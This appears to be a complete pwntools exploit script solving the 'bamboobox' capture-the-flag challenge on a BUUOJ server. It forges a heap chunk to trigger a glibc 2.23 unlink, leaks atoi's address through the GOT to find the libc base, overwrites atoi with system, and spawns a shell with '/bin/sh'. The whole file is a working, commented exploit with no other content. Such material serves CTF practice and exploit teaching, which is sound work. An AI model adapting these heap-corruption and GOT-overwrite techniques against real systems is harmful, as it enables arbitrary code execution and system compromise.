from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 25626
elfpath = './bamboobox'
libcpath = '/home/leo/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so'
ldpath = '/home/leo/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so'

if args.LOCAL:
    p = process([ldpath, elfpath], env={'LD_PRELOAD': libcpath})
    # gdb.attach(p)
else:
    p = remote(host, port)


def s(content): return p.send(content)
def sl(content): return p.sendline(content)
def r(n): return p.recv(n)
def ru(pattern): return p.recvuntil(pattern)
def rl(): return p.recvline()
def ru7f(): return p.recvuntil(b'\x7f')
def su(x): return p.success(x)
def shell(): return p.interactive()


def command(c):
    ru(b"Your choice:")
    sl(str(c).encode())

def show():
    command(1)

def add(size, content):
    command(2)
    ru(b"Please enter the length of item name:")
    sl(str(size).encode())
    ru(b"Please enter the name of item:")
    s(content)

def edit(index, size, content):
    command(3)
    ru(b"Please enter the index of item:")
    sl(str(index).encode())
    ru(b"length of item name:")
    sl(str(size).encode())
    ru(b"new name of the item:")
    s(content)

def free(index):
    command(4)
    ru(b"Please enter the index of item:")
    sl(str(index).encode())

# start pwning : taget is getting shell
# ubuntu 16 means glibc2.23
# looks like a off-by-null heap exploitation
# and heap overflow of anysize

# allocate heap
add(0x40, b'a'*8) # id 0
add(0x80, b'b'*8) # id 1
add(0x80, b'c'*8) # id 2

# create fake chunk
ptr = 0x6020c8 # where chunk address starts
fake_chunk = p64(0) + p64(0x41)
fake_chunk += p64(ptr-0x18) + p64(ptr-0x10) # bypass the unlink check in glibc 2.23
fake_chunk = fake_chunk.ljust(0x40, b'a')
fake_chunk += p64(0x40) + p64(0x90) # psize and size of chunk 1
edit(0, len(fake_chunk), fake_chunk) # write fake chunk

free(1) # trigger unlink and overwrite chunk0 address to ptr - 0x18

e = ELF(elfpath)
libc = ELF(libcpath)
payload = p64(0)*2
payload += p64(0x40) + p64(e.got['atoi'])
edit(0, 0x40, payload)

show()
atoi_address = u64(ru7f()[-6:]+b'\x00'*2)
libc_base = atoi_address - libc.sym['atoi']
system = libc.sym['system'] + libc_base

edit(0, 8, p64(system))
ru(b'Your choice:')
sl(b'/bin/sh\x00')

# classical unlink in glibc 2.23
shell()



